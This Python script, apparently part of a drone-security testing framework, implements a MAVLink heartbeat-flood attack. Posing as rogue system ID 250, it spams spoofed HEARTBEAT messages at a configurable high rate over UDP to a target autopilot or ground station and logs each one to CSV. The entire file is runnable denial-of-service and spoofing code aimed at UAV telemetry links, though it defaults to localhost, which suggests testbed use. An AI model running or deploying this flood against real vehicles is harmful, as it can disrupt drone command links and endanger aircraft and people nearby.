import argparse
import csv
import time
from datetime import datetime, timezone
from pathlib import Path

from pymavlink import mavutil

try:
    from framework.base import BaseAttack
except ImportError:
    import sys
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
    from framework.base import BaseAttack

MAVLINK_VERSION = 3


class HeartbeatFloodAttack(BaseAttack):
    """High-rate HEARTBEAT flood from a rogue source system."""

    def __init__(self):
        self._running = False

    @property
    def name(self) -> str:
        return "heartbeat_flood"

    @property
    def description(self) -> str:
        return "High-rate HEARTBEAT flood from rogue source system"

    def execute(self, *, target, duration, rate, out_dir, **kwargs):
        self._running = True
        out_dir = Path(out_dir)
        out_dir.mkdir(exist_ok=True)

        ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
        out_path = out_dir / f"attack_heartbeat_{ts}.csv"

        conn = mavutil.mavlink_connection(f"udpout:{target}")
        conn.mav.srcSystem = 250
        conn.mav.srcComponent = 1

        period = 1.0 / max(rate, 1.0)
        start = time.time()
        seq = 0

        with out_path.open("w", newline="", encoding="utf-8") as fh:
            writer = csv.writer(fh)
            writer.writerow(["timestamp", "msg_name", "msg_id", "seq"])

            while self._running and time.time() - start < duration:
                conn.mav.heartbeat_send(
                    mavutil.mavlink.MAV_TYPE_GCS,
                    mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                    0, 0,
                    mavutil.mavlink.MAV_STATE_ACTIVE,
                    MAVLINK_VERSION,
                )
                writer.writerow([time.time(), "HEARTBEAT",
                                 mavutil.mavlink.MAVLINK_MSG_ID_HEARTBEAT, seq])
                seq += 1
                time.sleep(period)

        return {"messages_sent": seq}

    def stop(self):
        self._running = False


def build_parser():
    parser = argparse.ArgumentParser(description="Heartbeat flooding attack.")
    parser.add_argument("--udp", default="127.0.0.1:14550", help="Host:port for udpout.")
    parser.add_argument("--rate", type=float, default=200.0, help="Messages per second.")
    parser.add_argument("--duration", type=float, default=10.0, help="Seconds to run.")
    parser.add_argument("--out-dir", default=None, help="Output directory for CSV.")
    return parser


def main():
    args = build_parser().parse_args()
    out_dir = Path(args.out_dir) if args.out_dir else Path(__file__).resolve().parents[1] / "out"
    out_dir.mkdir(exist_ok=True)

    ts = datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S")
    out_path = out_dir / f"attack_heartbeat_{ts}.csv"

    conn = mavutil.mavlink_connection(f"udpout:{args.udp}")
    conn.mav.srcSystem = 250
    conn.mav.srcComponent = 1

    period = 1.0 / max(args.rate, 1.0)
    start = time.time()
    seq = 0

    with out_path.open("w", newline="", encoding="utf-8") as fh:
        writer = csv.writer(fh)
        writer.writerow(["timestamp", "msg_name", "msg_id", "seq"])

        while time.time() - start < args.duration:
            conn.mav.heartbeat_send(
                mavutil.mavlink.MAV_TYPE_GCS,
                mavutil.mavlink.MAV_AUTOPILOT_INVALID,
                0,
                0,
                mavutil.mavlink.MAV_STATE_ACTIVE,
                MAVLINK_VERSION,
            )
            writer.writerow([time.time(), "HEARTBEAT", mavutil.mavlink.MAVLINK_MSG_ID_HEARTBEAT, seq])
            seq += 1
            time.sleep(period)


if __name__ == "__main__":
    main()
